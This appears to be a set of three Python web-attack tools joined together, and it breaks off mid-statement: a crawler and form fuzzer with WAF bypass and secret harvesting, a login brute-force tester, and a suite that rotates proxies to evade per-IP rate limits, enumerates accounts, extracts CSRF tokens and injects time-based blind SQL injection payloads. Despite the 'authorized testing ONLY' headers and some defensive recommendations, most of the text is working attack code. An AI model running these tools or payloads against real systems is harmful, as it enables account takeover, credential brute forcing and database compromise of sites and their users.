    def fuzz_all(self, use_bypass=False):
        mode = "bypass-mode" if use_bypass else "normal-mode"
        print(f"\n{Fore.MAGENTA}[*] Fuzzing forms ({mode})...")
        if not self.results["forms"]:
            print(f"{Fore.YELLOW}[!] No forms to fuzz")
            return

        for form in self.results["forms"]:
            hits = self.fuzz_form(form, use_bypass=use_bypass)
            if use_bypass:
                self.results["bypass"].extend(hits)
            else:
                self.results["fuzz"].extend(hits)

        total = len(self.results["fuzz"]) + len(self.results["bypass"])
        print(f"{Fore.GREEN}[✓] Fuzzing done. Findings: {total}")

    # ── REPORTS ──
    def save_reports(self):
        out = {k: (list(v) if isinstance(v, set) else v)
               for k, v in self.results.items()}

        with open(f"{self.out}/report.json", "w") as f:
            json.dump(out, f, indent=2, default=str)

        with open(f"{self.out}/findings.csv", "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["form","method","category","payload","chain","evidence"])
            for h in self.results["fuzz"] + self.results["bypass"]:
                w.writerow([h["form"], h["method"], h["category"],
                            h["payload"], h["chain"], h["evidence"]])

        # HTML report
        def row(h):
            return (f"<tr><td>{h['form']}</td><td>{h['method']}</td>"
                    f"<td style='color:#f33'>{h['category']}</td>"
                    f"<td><code>{h['payload'][:80]}</code></td>"
                    f"<td>{h['chain']}</td>"
                    f"<td>{h['evidence']}</td></tr>")

        html = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>HUNTER — {self.start_url}</title>
<style>
body{{font-family:monospace;background:#0d1117;color:#c9d1d9;padding:20px}}
h1,h2{{color:#58a6ff}}table{{border-collapse:collapse;width:100%;margin:10px 0}}
td,th{{border:1px solid #30363d;padding:6px}}th{{background:#161b22}}
code{{background:#161b22;padding:2px 4px;border-radius:3px}}
.badge{{display:inline-block;padding:2px 8px;border-radius:4px;margin:2px}}
.waf{{background:#d73a49}} .ok{{background:#238636}}
</style></head><body>
<h1>🎯 HUNTER Report</h1>
<p><b>Target:</b> {self.start_url}</p>
<p><b>WAF:</b>
   <span class="badge {'waf' if self.results['waf']['name'] else 'ok'}">
     {self.results['waf']['name'] or 'None'}
   </span>
   {self.results['waf']['evidence'] or ''}
</p>
<p><b>Pages:</b> {len(self.results['pages'])} ·
   <b>Forms:</b> {len(self.results['forms'])} ·
   <b>Fuzz findings:</b> {len(self.results['fuzz'])} ·
   <b>Bypass findings:</b> {len(self.results['bypass'])} ·
   <b>Secrets:</b> {len(self.results['secrets'])}
</p>

<h2>🚨 Fuzz Findings (Normal)</h2>
<table><tr><th>Form</th><th>Method</th><th>Type</th>
<th>Payload</th><th>Chain</th><th>Evidence</th></tr>
{''.join(row(h) for h in self.results['fuzz'])}
</table>

<h2>🔥 Bypass Findings (Encoded Chains)</h2>
<table><tr><th>Form</th><th>Method</th><th>Type</th>
<th>Payload</th><th>Chain</th><th>Evidence</th></tr>
{''.join(row(h) for h in self.results['bypass'])}
</table>

<h2>🔑 Secrets</h2>
<ul>{''.join(f"<li><b>{s['type']}</b>: <code>{s['match']}</code> — {s['page']}</li>"
             for s in self.results['secrets'])}</ul>
</body></html>"""

        with open(f"{self.out}/report.html", "w") as f:
            f.write(html)

        print(f"\n{Fore.GREEN}[✓] Reports → {self.out}/report.{{json,html}}  + findings.csv")


# ═══════════════════════════════════════════════════════════════
#                         CLI
# ═══════════════════════════════════════════════════════════════

def main():
    p = argparse.ArgumentParser(description="HUNTER — Recon + Fuzz + WAF + Bypass")
    p.add_argument("url")
    p.add_argument("-d", "--depth",  type=int, default=2)
    p.add_argument("-p", "--pages",  type=int, default=50)
    p.add_argument("-t", "--threads",type=int, default=6)
    p.add_argument("--delay",        type=float, default=0.3)
    p.add_argument("--waf",          action="store_true", help="WAF fingerprint")
    p.add_argument("--fuzz",         action="store_true", help="normal fuzz")
    p.add_argument("--bypass",       action="store_true", help="encoded-chain bypass fuzz")
    p.add_argument("--all",          action="store_true", help="everything")
    p.add_argument("--cookie", help="cookies 'k=v; k2=v2'")
    p.add_argument("--header", action="append", help="'K: V' (repeatable)")
    p.add_argument("-o", "--out", default="hunter_out")
    args = p.parse_args()

    cookies = {}
    if args.cookie:
        for kv in args.cookie.split(';'):
            if '=' in kv:
                k, v = kv.strip().split('=', 1)
                cookies[k] = v
    headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                k, v = h.split(':', 1)
                headers[k.strip()] = v.strip()

    hunter = Hunter(
        args.url, max_depth=args.depth, max_pages=args.pages,
        threads=args.threads, delay=args.delay,
        cookies=cookies, headers=headers, output_dir=args.out
    )

    hunter.crawl()
    if args.waf or args.all:    hunter.fingerprint_waf()
    if args.fuzz or args.all:   hunter.fuzz_all(use_bypass=False)
    if args.bypass or args.all: hunter.fuzz_all(use_bypass=True)

    hunter.save_reports()


if __name__ == "__main__":
    main()

=====================================================================

#!/usr/bin/env python3
"""
Login Security Tester — Rate Limit / Lockout / CAPTCHA / Timing Analyzer
For authorized testing ONLY.
"""

import re, time, json, argparse, statistics
from datetime import datetime
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class _D:
        def __getattr__(self, _): return ""
    Fore = Style = _D()

# ═══════════════════════════════════════════════════════════════
#                    DETECTION HELPERS
# ═══════════════════════════════════════════════════════════════

CAPTCHA_HINTS = [
    "captcha", "recaptcha", "hcaptcha", "g-recaptcha",
    "verify you are human", "prove you are human",
    "cloudflare", "cf-challenge", "turnstile",
]

LOCKOUT_HINTS = [
    "account locked", "account is locked", "too many failed",
    "too many attempts", "temporarily locked", "locked out",
    "exceeded", "suspicious activity", "blocked",
]

RATE_LIMIT_HINTS = [
    "too many requests", "rate limit", "slow down",
    "try again later", "retry after", "throttle",
]

SUCCESS_HINTS = [
    "welcome", "dashboard", "logout", "my account",
    "signed in", "logged in", "profile",
]

# ═══════════════════════════════════════════════════════════════
#                    LOGIN TESTER
# ═══════════════════════════════════════════════════════════════

class LoginSecurityTester:
    def __init__(self, login_url, username, *,
                 password_field="password", username_field="username",
                 attempts=10, delay=0.0, timeout=10,
                 success_url_marker=None, failure_url_marker=None,
                 headers=None, cookies=None, proxy=None, verify_ssl=True):
        self.url              = login_url
        self.username         = username
        self.pw_field         = password_field
        self.user_field       = username_field
        self.attempts         = attempts
        self.delay            = delay
        self.timeout          = timeout
        self.success_marker   = success_url_marker
        self.failure_marker   = failure_url_marker

        self.session = requests.Session()
        retry = Retry(total=0)  # no retry — we want raw behavior
        self.session.mount("http://", HTTPAdapter(max_retries=retry))
        self.session.mount("https://", HTTPAdapter(max_retries=retry))
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (LoginSecurityTester)"
        })
        if headers: self.session.headers.update(headers)
        if cookies: self.session.cookies.update(cookies)
        if proxy:   self.session.proxies = {"http": proxy, "https": proxy}
        self.session.verify = verify_ssl

        self.results = {
            "target":         login_url,
            "username":       username,
            "attempts":       [],
            "baseline":       {},
            "summary":        {},
            "findings":       [],
        }

    # ─────────── single attempt ───────────
    def _attempt(self, password):
        data = {self.user_field: self.username, self.pw_field: password}
        t0 = time.time()
        try:
            r = self.session.post(self.url, data=data,
                                  timeout=self.timeout, allow_redirects=True)
            elapsed = time.time() - t0
            return {
                "password":  password,
                "status":    r.status_code,
                "length":    len(r.text),
                "time":      round(elapsed, 3),
                "url":       r.url,
                "body":      r.text,
                "headers":   dict(r.headers),
            }
        except Exception as e:
            return {
                "password": password,
                "error":    str(e),
                "time":     round(time.time() - t0, 3),
                "status":   0,
                "length":   0,
                "body":     "",
                "url":      "",
                "headers":  {},
            }

    # ─────────── response classification ───────────
    def _classify(self, resp):
        body_low = resp["body"].lower()
        url_low  = resp["url"].lower()

        for h in CAPTCHA_HINTS:
            if h in body_low:
                return "CAPTCHA"
        for h in LOCKOUT_HINTS:
            if h in body_low:
                return "LOCKOUT"
        for h in RATE_LIMIT_HINTS:
            if h in body_low:
                return "RATE_LIMIT"
        if resp["status"] == 429:
            return "RATE_LIMIT"
        if resp["status"] in (403, 503):
            return "BLOCKED"
        # Retry-After header
        if "retry-after" in {k.lower() for k in resp["headers"]}:
            return "RATE_LIMIT"
        # Success detection
        if self.success_marker and self.success_marker.lower() in url_low:
            return "SUCCESS"
        if self.failure_marker and self.failure_marker.lower() in url_low:
            return "FAIL"
        for s in SUCCESS_HINTS:
            if s in body_low and "invalid" not in body_low:
                return "SUCCESS"
        return "FAIL"

    # ─────────── baseline ───────────
    def _baseline(self):
        print(f"{Fore.CYAN}[*] Baseline: 1 valid-shape attempt")
        resp = self._attempt("baseline_" + "x" * 8)
        self.results["baseline"] = {
            "status": resp["status"],
            "length": resp["length"],
            "time":   resp["time"],
        }
        print(f"    → {resp['status']} · {resp['length']}B · {resp['time']}s")

    # ─────────── main test ───────────
    def run(self, password_list=None):
        if not password_list:
            password_list = [f"wrong_{i:03d}" for i in range(1, self.attempts + 1)]

        self._baseline()
        print(f"\n{Fore.MAGENTA}{'═'*62}")
        print(f"{Fore.MAGENTA} ATTACK SEQUENCE — {len(password_list)} attempts")
        print(f"{Fore.MAGENTA}{'═'*62}")

        captcha_seen = False
        lockout_seen = False
        rate_limit_at = None
        block_at = None
        block_code = None
        time_series = []

        for idx, pwd in enumerate(password_list, 1):
            r = self._attempt(pwd)
            verdict = self._classify(r)

            if r["error"]:
                print(f"{Fore.RED}  #{idx:>2} ERROR → {r['error']}")
                self.results["attempts"].append({
                    "n": idx, "password": pwd, "error": r["error"],
                    "verdict": "ERROR", "time": r["time"],
                })
                continue

            color = {
                "FAIL":        Fore.WHITE,
                "SUCCESS":     Fore.GREEN,
                "RATE_LIMIT":  Fore.YELLOW,
                "LOCKOUT":     Fore.RED,
                "CAPTCHA":     Fore.MAGENTA,
                "BLOCKED":     Fore.RED,
            }.get(verdict, Fore.WHITE)

            print(f"{color}  #{idx:>2} [{verdict:<10}] "
                  f"{r['status']} · {r['length']}B · {r['time']}s")

            self.results["attempts"].append({
                "n": idx, "password": pwd, "status": r["status"],
                "length": r["length"], "time": r["time"],
                "verdict": verdict,
            })
            time_series.append(r["time"])

            if verdict == "CAPTCHA" and not captcha_seen:
                captcha_seen = True
                self.results["findings"].append({
                    "type": "CAPTCHA", "at_attempt": idx,
                    "note": "CAPTCHA triggered after repeated failures"
                })
            if verdict == "LOCKOUT" and not lockout_seen:
                lockout_seen = True
                self.results["findings"].append({
                    "type": "ACCOUNT_LOCKOUT", "at_attempt": idx,
                    "threshold": idx,
                    "note": f"Account locked after {idx} failed attempts"
                })
            if verdict == "RATE_LIMIT" and rate_limit_at is None:
                rate_limit_at = idx
                self.results["findings"].append({
                    "type": "RATE_LIMIT", "at_attempt": idx,
                    "note": f"429/Retry-After after {idx} attempts"
                })
            if verdict == "BLOCKED" and block_at is None:
                block_at, block_code = idx, r["status"]
                self.results["findings"].append({
                    "type": "IP_BLOCK", "at_attempt": idx,
                    "status": r["status"],
                    "note": f"IP blocked (HTTP {r['status']}) after {idx} attempts"
                })

            if self.delay:
                time.sleep(self.delay)

        # ── timing anomaly ──
        if len(time_series) > 3:
            mean = statistics.mean(time_series)
            stdev = statistics.pstdev(time_series)
            outliers = [t for t in time_series if t > mean + 3 * stdev]
            if outliers:
                self.results["findings"].append({
                    "type": "TIMING_ANOMALY",
                    "note": f"{len(outliers)} responses were >3σ slower — "
                            f"possible lockout delay / backend blocking",
                    "mean": round(mean, 3),
                    "max":  round(max(time_series), 3),
                })

        # ── summary ──
        self.results["summary"] = {
            "total_attempts":    len(self.results["attempts"]),
            "rate_limit_found":  rate_limit_at is not None,
            "rate_limit_at":     rate_limit_at,
            "lockout_found":     lockout_seen,
            "captcha_found":     captcha_seen,
            "ip_block_found":    block_at is not None,
            "block_status":      block_code,
            "avg_time":          round(statistics.mean(time_series), 3) if time_series else 0,
        }

        self._report()
        return self.results

    # ─────────── verdict ───────────
    def _report(self):
        s = self.results["summary"]
        print(f"\n{Fore.MAGENTA}{'═'*62}")
        print(f"{Fore.MAGENTA} SECURITY ASSESSMENT")
        print(f"{Fore.MAGENTA}{'═'*62}")

        findings = []

        if s["ip_block_found"]:
            findings.append((Fore.GREEN, "✅ IP blocking is active",
                             f"blocked after {s['rate_limit_at'] or '?'} attempts"))
        if s["rate_limit_found"]:
            findings.append((Fore.GREEN, "✅ Rate limiting is active",
                             f"triggered at attempt #{s['rate_limit_at']}"))
        if s["lockout_found"]:
            findings.append((Fore.GREEN, "✅ Account lockout is active",
                             f"found in {s['total_attempts']} attempts"))
        if s["captcha_found"]:
            findings.append((Fore.GREEN, "✅ CAPTCHA is enforced",
                             "human verification required"))

        if not (s["ip_block_found"] or s["rate_limit_found"]
                or s["lockout_found"] or s["captcha_found"]):
            findings.append((Fore.RED, "❌ NO brute-force protection detected",
                             "unlimited attempts allowed"))

        for color, msg, detail in findings:
            print(f"  {color}{msg}  ({detail})")

        # recommendations
        print(f"\n{Fore.CYAN}Recommendations:")
        if s["rate_limit_found"] or s["ip_block_found"]:
            print(f"  {Fore.GREEN}· Good: rate limiting / IP block in place")
        else:
            print(f"  {Fore.RED}· Add rate limiting (e.g. 5 attempts / 60s)")
            print(f"  {Fore.RED}· Add progressive delays or exponential backoff")
        if not s["lockout_found"]:
            print(f"  {Fore.YELLOW}· Consider account lockout after N failures")
        if not s["captcha_found"]:
            print(f"  {Fore.YELLOW}· Consider CAPTCHA after 3–5 failures")
        print(f"  {Fore.CYAN}· Log failed attempts and alert on bursts")
        print(f"  {Fore.CYAN}· Enforce MFA for sensitive accounts")

    # ─────────── save ───────────
    def save(self, path="login_test.json"):
        clean = {**self.results}
        # strip body text to keep file small
        clean["attempts"] = [{k: v for k, v in a.items()}
                             for a in clean["attempts"]]
        with open(path, "w") as f:
            json.dump(clean, f, indent=2, default=str)
        print(f"\n{Fore.GREEN}[✓] Saved → {path}")


# ═══════════════════════════════════════════════════════════════
#                         CLI
# ═══════════════════════════════════════════════════════════════

def main():
    p = argparse.ArgumentParser(description="Login Security Tester")
    p.add_argument("url", help="login endpoint (POST)")
    p.add_argument("username", help="username / email to test")
    p.add_argument("-n", "--attempts", type=int, default=10)
    p.add_argument("--delay", type=float, default=0.0,
                   help="delay between attempts (sec)")
    p.add_argument("--pw-field", default="password")
    p.add_argument("--user-field", default="username")
    p.add_argument("--success-marker", help="URL substring on success")
    p.add_argument("--failure-marker", help="URL substring on failure")
    p.add_argument("--cookie", help="'k=v; k2=v2'")
    p.add_argument("--header", action="append", help="'K: V' (repeatable)")
    p.add_argument("--proxy", help="http://127.0.0.1:8080")
    p.add_argument("--no-verify", action="store_true")
    p.add_argument("-w", "--wordlist", help="file with passwords (one per line)")
    p.add_argument("-o", "--out", default="login_test.json")
    args = p.parse_args()

    passwords = None
    if args.wordlist:
        with open(args.wordlist) as f:
            passwords = [l.strip() for l in f if l.strip()][:args.attempts]

    cookies = {}
    if args.cookie:
        for kv in args.cookie.split(';'):
            if '=' in kv:
                k, v = kv.strip().split('=', 1)
                cookies[k] = v
    headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                k, v = h.split(':', 1)
                headers[k.strip()] = v.strip()

    tester = LoginSecurityTester(
        args.url, args.username,
        password_field=args.pw_field, username_field=args.user_field,
        attempts=args.attempts, delay=args.delay,
        success_url_marker=args.success_marker,
        failure_url_marker=args.failure_marker,
        headers=headers, cookies=cookies, proxy=args.proxy,
        verify_ssl=not args.no_verify,
    )
    tester.run(password_list=passwords)
    tester.save(args.out)


if __name__ == "__main__":
    main()

=====================================================================

#!/usr/bin/env python3
"""
LOGIN SECURITY SUITE — All-in-One
Distributed · Enumeration · CSRF · Blind SQLi · POC · Dashboard · Proxy Check
Authorized testing ONLY.
"""

import re, os, time, json, html as html_lib, argparse, statistics
from collections import defaultdict
from datetime import datetime
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class _D:
        def __getattr__(self, _): return ""
    Fore = Style = _D()

# ═══════════════════════════════════════════════════════════════
#                        HINTS
# ═══════════════════════════════════════════════════════════════

CAPTCHA_HINTS = ["captcha", "recaptcha", "hcaptcha", "g-recaptcha",
                 "verify you are human", "cf-challenge", "turnstile"]
LOCKOUT_HINTS = ["account locked", "account is locked", "too many failed",
                 "too many attempts", "temporarily locked", "locked out",
                 "exceeded", "suspicious activity", "blocked"]
RATE_LIMIT_HINTS = ["too many requests", "rate limit", "slow down",
                    "try again later", "throttle"]
SUCCESS_HINTS = ["welcome", "dashboard", "logout", "my account",
                 "signed in", "logged in", "profile"]

# ═══════════════════════════════════════════════════════════════
#                     PROXY HEALTH CHECK
# ═══════════════════════════════════════════════════════════════

class ProxyChecker:
    """Filter dead/slow proxies before distributed test."""

    @staticmethod
    def check(proxy, test_url="https://httpbin.org/ip", timeout=8):
        """Return dict {proxy, alive, latency, exit_ip, error}"""
        try:
            t0 = time.time()
            r = requests.get(test_url,
                             proxies={"http": proxy, "https": proxy},
                             timeout=timeout)
            elapsed = round(time.time() - t0, 2)
            if r.status_code == 200:
                try:
                    exit_ip = r.json().get("origin", "?")
                except Exception:
                    exit_ip = "?"
                return {"proxy": proxy, "alive": True,
                        "latency": elapsed, "exit_ip": exit_ip}
            return {"proxy": proxy, "alive": False,
                    "latency": elapsed, "error": f"HTTP {r.status_code}"}
        except Exception as e:
            return {"proxy": proxy, "alive": False, "error": str(e)[:60]}

    @classmethod
    def check_all(cls, proxies, threads=10):
        from concurrent.futures import ThreadPoolExecutor, as_completed
        print(f"\n{Fore.MAGENTA}{'═'*64}")
        print(f"{Fore.MAGENTA} PROXY HEALTH CHECK — {len(proxies)} proxies")
        print(f"{Fore.MAGENTA}{'═'*64}")

        results = []
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futures = {ex.submit(cls.check, p): p for p in proxies}
            for i, fut in enumerate(as_completed(futures), 1):
                r = fut.result()
                results.append(r)
                if r["alive"]:
                    print(f"{Fore.GREEN}  [{i:>2}] ✅ {r['proxy'][:40]:<40} "
                          f"{r['latency']}s  ({r['exit_ip']})")
                else:
                    print(f"{Fore.RED}  [{i:>2}] ❌ {r['proxy'][:40]:<40} "
                          f"{r.get('error','')[:30]}")

        alive  = [r for r in results if r["alive"]]
        # sort by latency
        alive.sort(key=lambda x: x["latency"])
        print(f"\n{Fore.CYAN}[*] Alive: {len(alive)}/{len(results)}")
        return [r["proxy"] for r in alive], results


# ═══════════════════════════════════════════════════════════════
#                     MAIN HUNTER
# ═══════════════════════════════════════════════════════════════

class LoginSuite:
    def __init__(self, login_url, *,
                 username_field="username", password_field="password",
                 timeout=10, headers=None, cookies=None,
                 verify_ssl=True, proxy_list=None):
        self.url          = login_url
        self.user_field   = username_field
        self.pw_field     = password_field
        self.timeout      = timeout
        self.verify       = verify_ssl
        self.proxies      = proxy_list or []
        self.extra_headers= headers or {}
        self.base_cookies = cookies or {}

        self.findings  = []
        self.timeline  = []   # (timestamp, type, detail)
        self.session_map = {}
        self.page_html = None

    # ─────────── session ───────────
    def _new_session(self, proxy=None):
        s = requests.Session()
        s.mount("http://",  HTTPAdapter(max_retries=Retry(total=0)))
        s.mount("https://", HTTPAdapter(max_retries=Retry(total=0)))
        s.headers.update({"User-Agent": "Mozilla/5.0 (LoginSuite)"})
        s.headers.update(self.extra_headers)
        s.cookies.update(self.base_cookies)
        if proxy:
            s.proxies = {"http": proxy, "https": proxy}
        s.verify = self.verify
        return s

    def _get_session(self, proxy=None):
        key = proxy or "__direct__"
        if key not in self.session_map:
            self.session_map[key] = self._new_session(proxy)
        return self.session_map[key]

    def _log(self, ftype, detail, severity="INFO"):
        self.findings.append({
            "type": ftype, "severity": severity, "note": detail,
            "time": datetime.now().isoformat(),
        })
        self.timeline.append({
            "time": datetime.now().strftime("%H:%M:%S"),
            "type": ftype, "detail": detail[:80], "severity": severity,
        })

    # ─────────── single attempt ───────────
    def _attempt(self, username, password, proxy=None, extra_data=None):
        sess = self._get_session(proxy)
        data = {self.user_field: username, self.pw_field: password}
        if extra_data: data.update(extra_data)
        t0 = time.time()
        try:
            r = sess.post(self.url, data=data, timeout=self.timeout,
                          allow_redirects=True)
            return {"status": r.status_code, "length": len(r.text),
                    "time": round(time.time() - t0, 3),
                    "url": r.url, "body": r.text, "proxy": proxy or "direct"}
        except Exception as e:
            return {"status": 0, "length": 0,
                    "time": round(time.time() - t0, 3),
                    "url": "", "body": "", "proxy": proxy or "direct",
                    "error": str(e)}

    def _classify(self, resp):
        body = resp["body"].lower()
        for h in CAPTCHA_HINTS:
            if h in body: return "CAPTCHA"
        for h in LOCKOUT_HINTS:
            if h in body: return "LOCKOUT"
        for h in RATE_LIMIT_HINTS:
            if h in body: return "RATE_LIMIT"
        if resp["status"] == 429: return "RATE_LIMIT"
        if resp["status"] in (403, 503): return "BLOCKED"
        for s in SUCCESS_HINTS:
            if s in body and "invalid" not in body: return "SUCCESS"
        return "FAIL"

    # ═══════════════════════════════════════════════════════════
    # 1️⃣ DISTRIBUTED TEST
    # ═══════════════════════════════════════════════════════════
    def distributed_test(self, username, attempts_per_proxy=5):
        print(f"\n{Fore.MAGENTA}{'═'*64}")
        print(f"{Fore.MAGENTA} 1️⃣  DISTRIBUTED RATE-LIMIT TEST")
        print(f"{Fore.MAGENTA}{'═'*64}")

        print(f"{Fore.CYAN}[*] Phase 1: exhaust on direct IP...")
        direct_blocked_at = None
        for i in range(attempts_per_proxy * 3):
            r = self._attempt(username, f"wrong_{i}")
            v = self._classify(r)
            if v in ("RATE_LIMIT", "BLOCKED", "LOCKOUT"):
                direct_blocked_at = i + 1
                print(f"{Fore.RED}  [+] blocked after {direct_blocked_at} ({v})")
                self._log("RATE_LIMIT_DIRECT", f"blocked at {direct_blocked_at}",
                          "MEDIUM")
                break
            print(f"  #{i+1:>2} [{v}] {r['status']} · {r['length']}B")

        if direct_blocked_at is None:
            self._log("NO_RATE_LIMIT",
                      f"no limit after {attempts_per_proxy*3} attempts", "HIGH")
            print(f"{Fore.RED}[❌] No rate limit at all!")
            return {"verdict": "NO_LIMIT"}

        if not self.proxies:
            print(f"\n{Fore.YELLOW}[!] No proxies — cannot test rotation")
            return {"verdict": "PER_IP_LIKELY",
                    "direct_blocked_at": direct_blocked_at}

        print(f"\n{Fore.CYAN}[*] Phase 2: rotate {len(self.proxies)} proxies...")
        works, fails = 0, 0
        for idx, proxy in enumerate(self.proxies, 1):
            print(f"\n  Proxy #{idx}: {proxy[:40]}")
            ok = 0
            for j in range(attempts_per_proxy):
                r = self._attempt(username, f"pw_{idx}_{j}", proxy=proxy)
                if r.get("error"):
                    print(f"    #{j+1} ERROR"); break
                v = self._classify(r)
                print(f"    #{j+1} [{v}] {r['status']}")
                if v in ("RATE_LIMIT", "BLOCKED", "LOCKOUT"):
                    break
                ok += 1
            if ok > 0: works += 1
            else: fails += 1

        if works > 0:
            self._log("RATE_LIMIT_PER_IP_BYPASSABLE",
                      f"{works}/{len(self.proxies)} proxies bypassed", "HIGH")
            print(f"{Fore.RED}[❌] BYPASSABLE — per-IP limit only!")
            return {"verdict": "PER_IP_BYPASSABLE", "working": works}
        else:
            self._log("RATE_LIMIT_PER_ACCOUNT",
                      "all proxies blocked", "LOW (good)")
            print(f"{Fore.GREEN}[✅] Per-account limit (strong)")
            return {"verdict": "PER_ACCOUNT"}

    # ═══════════════════════════════════════════════════════════
    # 2️⃣ ACCOUNT ENUMERATION
    # ═══════════════════════════════════════════════════════════
    def enumerate_accounts(self, username_list, samples=3):
        print(f"\n{Fore.MAGENTA}{'═'*64}")
        print(f"{Fore.MAGENTA} 2️⃣  ACCOUNT ENUMERATION")
        print(f"{Fore.MAGENTA}{'═'*64}")

        results = {}
        for user in username_list:
            times, lens, bodies = [], [], []
            for _ in range(samples):
                r = self._attempt(user, "enum_pw_x")
                if r.get("error"): continue
                times.append(r["time"]); lens.append(r["length"])
                bodies.append(r["body"])
                time.sleep(0.2)
            if not times: continue
            results[user] = {
                "avg_time": round(statistics.mean(times), 4),
                "avg_length": round(statistics.mean(lens), 1),
                "message": self._extract_msg(bodies[0]),
            }

        print(f"  {'user':<20} {'avg_t':<8} {'len':<8} message")
        for u, r in results.items():
            print(f"  {u:<20} {r['avg_time']:<8} {r['avg_length']:<8} "
                  f"{r['message'][:40]}")

        # timing anomaly
        valid_t = [r["avg_time"] for r in results.values()]
        if len(valid_t) >= 2:
            mean_t = statistics.mean(valid_t)
            stdev  = statistics.pstdev(valid_t) or 0.001
            outliers = [u for u, r in results.items()
                        if r["avg_time"] > mean_t + 2 * stdev]
            if outliers:
                self._log("TIMING_ENUMERATION",
                          f"suspicious: {outliers}", "MEDIUM")
                print(f"{Fore.YELLOW}[!] Timing outlier: {outliers}")

        # message diff
        msgs = set(r["message"] for r in results.values())
        if len(msgs) > 1:
            self._log("MESSAGE_ENUMERATION",
                      f"messages: {list(msgs)}", "HIGH")
            print(f"{Fore.RED}[❌] Message leak: {list(msgs)}")

        return results

    def _extract_msg(self, html):
        soup = BeautifulSoup(html, 'lxml')
        for sel in ['.error', '.alert', '.message', '.flash', '[role=alert]']:
            el = soup.select_one(sel)
            if el: return el.get_text(strip=True)[:80]
        for txt in soup.stripped_strings:
            t = txt.lower()
            if any(k in t for k in ("invalid", "error", "wrong", "not found")):
                return txt[:80]
        return "(no message)"

    # ═══════════════════════════════════════════════════════════
    # 3️⃣ CSRF AUTO-EXTRACT
    # ═══════════════════════════════════════════════════════════
    def csrf_test(self, username, password_list):
        print(f"\n{Fore.MAGENTA}{'═'*64}")
        print(f"{Fore.MAGENTA} 3️⃣  CSRF TEST")
        print(f"{Fore.MAGENTA}{'═'*64}")

        sess = self._get_session()
        try:
            r = sess.get(self.url, timeout=self.timeout)
            self.page_html = r.text
        except Exception as e:
            print(f"{Fore.RED}[!] GET failed: {e}"); return {}

        soup = BeautifulSoup(r.text, 'lxml')
        tokens = {}
        for inp in soup.find_all('input', type='hidden'):
            n, v = inp.get('name'), inp.get('value')
            if n and v and (re.search(r'(csrf|token|nonce|authenticity|xsrf)', n, re.I)
                            or len(v) > 16):
                tokens[n] = v

        print(f"{Fore.CYAN}[*] Found {len(tokens)} token(s):")
        for k, v in tokens.items():
            print(f"    {k} = {v[:50]}")

        if not tokens:
            self._log("NO_CSRF", "no token found in login form", "MEDIUM")
            print(f"{Fore.YELLOW}[⚠] No CSRF token — login form unprotected")

        # with token
        r_w = self._attempt(username, password_list[0], extra_data=tokens)
        v_w = self._classify(r_w)
        # without
        r_wo = self._attempt(username, password_list[0], extra_data=None)
        v_wo = self._classify(r_wo)

        print(f"\n  with token:    [{v_w}] {r_w['status']}")
        print(f"  without token: [{v_wo}] {r_wo['status']}")

        if tokens and v_wo == "FAIL" and v_w in ("FAIL", "SUCCESS"):
            self._log("CSRF_ENFORCED", "token required", "LOW (good)")
            print(f"{Fore.GREEN}[✅] CSRF enforced")
        elif not tokens:
            pass  # already logged
        return {"tokens": tokens, "with": v_w, "without": v_wo}

    # ═══════════════════════════════════════════════════════════
    # 4️⃣ TIMING-BASED BLIND SQLi  ⭐ NEW
    # ═══════════════════════════════════════════════════════════
    def blind_sqli_test(self, username, baseline_samples=3, sleep_sec=3):
        """
        Compare response time:
        - baseline (normal password)
        - SQLi payload with SLEEP
        If SLEEP payload causes delay ≈ sleep_sec → blind SQLi confirmed.
        """
        print(f"\n{Fore.MAGENTA}{'═'*64}")
        print(f"{Fore.MAGENTA} 4️⃣  BLIND SQLi (TIMING-BASED)")
        print(f"{Fore.MAGENTA}{'═'*64}")
        print(f"{Fore.CYAN}[*] Sleep time = {sleep_sec}s")

        # ── baseline: normal failed login ──
        print(f"\n{Fore.CYAN}[*] Baseline ({baseline_samples} samples)...")
        baseline_times = []
        for i in range(baseline_samples):
            r = self._attempt(username, "baseline_wrong_pw")
            if not r.get("error"):
                baseline_times.append(r["time"])
                print(f"    #{i+1}: {r['time']}s")
            time.sleep(0.3)

        if not baseline_times:
            print(f"{Fore.RED}[!] Baseline failed"); return
        base_mean = statistics.mean(baseline_times)
        base_max  = max(baseline_times)
        threshold = base_max + sleep_sec * 0.7
        print(f"    baseline mean={base_mean:.2f}s  max={base_max:.2f}s  "
              f"threshold={threshold:.2f}s")

        # ── SQLi payloads (skip if DB not MySQL → try multiple) ──
        payloads = {
            "MySQL (username)":   (f"{username}' OR SLEEP({sleep_sec})-- -", "any"),
            "MySQL (username 2)": (f"{username}' AND SLEEP({sleep_sec})#", "any"),
            "MySQL in password":  (username, f"' OR SLEEP({sleep_sec})-- -"),
            "MySQL in pw 2":      (username, f"' AND SLEEP({sleep_sec})#"),
            "MySQL time-based":   (username, f"1' AND (SELECT * FROM "
                                              f"(SELECT(SLEEP({sleep_sec})))a)-- -"),
            "MSSQL":              (username, f"'; WAITFOR DELAY '0:0:{sleep_sec}'--"),
            "Postgres":           (username, f"'; SELECT pg_sleep({sleep_sec})--"),
            "SQLite":             (username, f"'; SELECT sleep({sleep_sec})--"),
        }

        print(f"\n{Fore.CYAN}[*] Testing {len(payloads)} payloads...")
        vuln_found = False

        for name, (user_payload, pw_payload) in payloads.items():
            # reset session to fresh (no lockout carryover)
            self.session_map.pop("__direct__", None)

            # inject in username OR password
            if pw_payload == "any":
                user, pw = user_payload, "irrelevant"
            else:
                user, pw = user_payload, pw_payload

            t0 = time.time()
            r = self._attempt(user, pw)
            elapsed = round(time.time() - t0, 2)

            if r.get("error"):
                print(f"  ✗ {name:<24} ERROR: {r['error'][:30]}")
                continue

            # verdict
            if elapsed >= threshold:
                print(f"{Fore.RED}  ⚠ {name:<24} {elapsed}s  "
                      f"(Δ +{elapsed - base_mean:.1f}s) ← VULNERABLE!")
                self._log("BLIND_SQLI",
